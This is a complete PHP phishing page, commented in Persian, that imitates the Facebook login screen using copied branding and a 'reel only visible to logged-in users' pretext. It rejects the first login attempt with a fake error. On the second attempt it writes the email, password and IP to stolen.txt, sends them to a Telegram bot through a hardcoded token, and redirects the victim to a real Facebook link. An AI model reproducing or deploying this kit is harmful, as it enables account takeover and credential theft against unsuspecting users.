<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['pass'] ?? '';

    // بار اول → همیشه خطا بده
    if (!isset($_SESSION['first_attempt'])) {
        $_SESSION['first_attempt'] = true;
        $_SESSION['saved_email']   = $email;
        $error = "The password that you've entered is incorrect.";
    }
    // بار دوم → بگیر و برو
    else {
        $ip    = $_SERVER['REMOTE_ADDR'];
        $time  = date('Y-m-d H:i:s', strtotime('+3:30 hours'));
        $data  = "Email: $email | Pass: $pass | IP: $ip | Time: $time\r\n";
        file_put_contents("stolen.txt", $data, FILE_APPEND | LOCK_EX);

        // ارسال به تلگرام
        $token   = "7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM";
        $chat_id = "123456789"; // ← آیدی خودت رو اینجا بنویس

        $message = "فیسبوک جدید (بار دوم)\n\nEmail: $email\nPass: $pass\nIP: $ip\nTime: $time";
        $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
        file_get_contents($url); // سریع و بدون curl

        session_unset();
        session_destroy();
        header("Location: https://www.facebook.com/share/r/17ayuhdYss/");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <!-- عنوان تب دقیقاً مثل فیسبوک واقعی -->
    <title>Log in to Facebook | Facebook</title>

    <!-- آیکن تب (فاوآیکون) دقیقاً همون فیسبوک -->
    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/018/930/698/non_2x/facebook-logo-facebook-icon-transparent-free-png.png" type="image/x-icon">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" type="image/x-icon">

    <!-- برای موبایل و PWA (وقتی از QR اسکن می‌کنه) -->
    <link rel="apple-touch-icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <style>
        body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;}
        ._9vt3{height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px;box-sizing:border-box;}
        ._8esj{background:#fff;max-width:396px;width:100%;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 0;text-align:center;}
        ._8icz img{height:106px;margin-bottom:-20px;}
        form{margin:20px 40px;}
        input{font-size:17px;padding:14px 16px;width:100%;border:1px solid #dddfe2;border-radius:6px;margin:6px 0;box-sizing:border-box;}
        input[type=submit]{background:#0866ff;color:#fff;font-weight:600;cursor:pointer;border:none;margin-top:10px;}
        input[type=submit]:hover{background:#1877f2;}
        .error{color:#e41e3f;background:#f8d7da;border:1px solid #f5c6cb;padding:10px;border-radius:6px;margin:10px 40px 0;font-size:14px;}
        .error::before{content:"×";font-weight:bold;margin-right:8px;}
        @media (max-width:500px){
            body{background:#fff;}
            ._9vt3{height:100vh;justify-content:flex-start;padding-top:80px;}
            ._8esj{box-shadow:none;border-radius:0;}
        }
    </style>
</head>
<body>
<div class="_9vt3">
    <div class="_8esj">
        <div class="_8icz">
            <img src="https://static.xx.fbcdn.net/rsrc.php/yV/r/-f2iZxoLvdL.svg" alt="Facebook">
        </div>

        <?php if (!empty($error)): ?>
            <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <form method="post">
            <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="off"
                   value="<?= htmlspecialchars($_SESSION['saved_email'] ?? $email ?? '') ?>">
            <input type="password" name="pass" placeholder="Password" required autocomplete="off">
            <input type="submit" value="Log in">
        </form>

        <div style="margin-top:30px;padding:0 40px;">
            <small style="color:#606770;">This reel is only visible to logged-in users</small>
        </div>
    </div>
</div>
</body>
</html>